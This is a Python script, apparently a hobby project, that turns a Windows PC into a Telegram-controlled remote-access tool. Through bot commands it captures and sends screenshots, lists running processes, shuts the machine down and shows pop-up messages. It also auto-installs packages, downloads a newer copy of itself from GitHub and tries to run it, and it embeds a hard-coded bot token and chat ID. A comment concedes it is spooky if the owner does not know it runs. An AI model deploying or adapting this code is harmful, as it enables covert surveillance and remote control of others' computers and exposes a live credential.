import urllib3 
import regex
import subprocess
import logging
import sys
import subprocess
import pkg_resources
import telegram.ext as tg
import psutil
import datetime
from messages import TelegramBot
import os
from win10toast import ToastNotifier
import tkinter 
from tkinter import messagebox
import pyautogui
from subprocess import call
from telegram import ForceReply, Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters


required={"python-telegram-bot","psutil","datetime","messages","win10toast"}
installed={pkg.key for pkg in pkg_resources.working_set}
missing=required-installed
if missing:
    subprocess.check_call([sys.executable,"-m","pip","install",*missing])







__version__=0.14
url="https://raw.githubusercontent.com/Mainakdey1/pcecho-python/main/finalmodule.pyw"
connection_pool=urllib3.PoolManager()
resp=connection_pool.request("GET",url)
match_regex=regex.search(r'__version__*= *(\S+)', resp.data.decode("utf-8"))

def update_file():
    origin_file.write(resp.data)
    origin_file.close()

match_regexno=float(match_regex.group(1))

if match_regexno>__version__:
    origin_file=open("testfile2.py","wb")
    #new version available. update immediately
    update_file()
    subprocess.call(origin_file,shell=True)
elif match_regexno<__version__:
    origin_file=open("testfile2.py","wb")
    #version rollback initiated. updating to old version
    update_file()
    subprocess.call(origin_file,shell=True)
else:
    #no new version found. 
    #update not called.

    print()

    #rest of the code
    
   
    

    #Unit test for checking that essential modules are present01



    #Unit test for checking and matching telegram version02

    from telegram import __version__ as TG_VER

    try:
        from telegram import __version_info__
    except ImportError:
        __version_info__ = (0, 0, 0, 0, 0)  # type: ignore[assignment]

    if __version_info__ < (20, 0, 0, "alpha", 1):
        raise RuntimeError(
            f"This example is not compatible with your current PTB version {TG_VER}. To view the "
            f"{TG_VER} version of this example, "
            f"visit https://docs.python-telegram-bot.org/en/v{TG_VER}/examples.html"
        )




    #Module import



    #Token for the telegram bot.
    token="6199318379:AAGmrDxxhYeYWabD8MqyrMMwKvVztDkPhGE"



        

    # Enable logging
    logging.basicConfig(
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
    )
    logger = logging.getLogger(__name__)


    # Define a few command handlers. These usually take the two arguments update and
    # context.

    #Function definition start. Call /start in the chat with the bot to start the bot.
    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Send a message when the command /start is issued."""
        user = update.effective_user
        await update.message.reply_html(
            rf"Hi {user.mention_html()}!",
            reply_markup=ForceReply(selective=True),
        )

    #Function definition of help command. Call the help command to see the available function calls to the bot.
    async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Send a message when the command /help is issued."""
        await update.message.reply_text("Help!")

    #Tertiary function defintions
    #Function definition getupdate. Call /getupdate in the chat with the bot to get a list of all proccesses running in the host system during the time of the function call.

    async def getupdate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        btime=psutil.boot_time()
        ftime=datetime.datetime.fromtimestamp(btime).strftime("%Y-%m-%d %H:%M:%S")
        processdict=[ftime,"\n\n"]
        for process in psutil.process_iter():
            processdict+=[process.name(),]
        await update.message.reply_text(processdict)


    #Function definition shutdown. Call /shutdown to shutdown the host system. Caution: This will stop the script and service to the bot will be terminated.

    async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        os.system('shutdown -s -t 0')


    #Function definition of Cpu time. Call /cpu_time to get the percentage of CPU used at the time the function is called.
    async def cpu_time(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:

        await update.message.reply_text(psutil.cpu_percent())


    #Function definition of message. This is not a command. Any message typed to the bot that is not a command gets displayed to the host system's screen(if there is one present)
    #bit of a spooky function if the host system's owner does not know about the program running in the background.
    async def show_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        
        _message=update.message.text
        messagebox.showinfo("Messenger from Alexandria",_message)
        
        #toaster=ToastNotifier()                  deprecated
        #toaster.show_toast("Windows",_message)  

    #Function definition of screenshot method. Call /sc to grab a new screenshot of the host system's screen. However this is still in development and the screenshot may not be of the 
    #resolution of the host system's screen.
    async def image_grab(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        img_grab=pyautogui.screenshot()
        img_grab.save("image1.png")
        await update.message._bot.sendDocument(update.message.chat_id,open("image1.png","rb"))
        print("sent")




    #Main

    def main() -> None:
        """Start the bot."""
        # Create the Application and pass it your bot's token.
        application = Application.builder().token(token).build()

        # on different commands - answer in Telegram
        application.add_handler(CommandHandler("start", start))  #type /start
        application.add_handler(CommandHandler("help", help_command)) #type /help
        application.add_handler(CommandHandler("shutdown",shutdown)) #type /shutdown
        application.add_handler(CommandHandler("cpu",cpu_time)) #type /cpu
        application.add_handler(CommandHandler("getupdate",getupdate)) #type /getupdate
        application.add_handler(CommandHandler("sc",image_grab)) #type /sc
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, show_message))


        # Run the bot until the user presses Ctrl-C
        application.run_polling()
    btime=datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    messageobj=TelegramBot(auth=token,chat_id='820919205',body='The service was started at'+' '+btime)
    messageobj.send()

    if __name__ == "__main__":

        main()


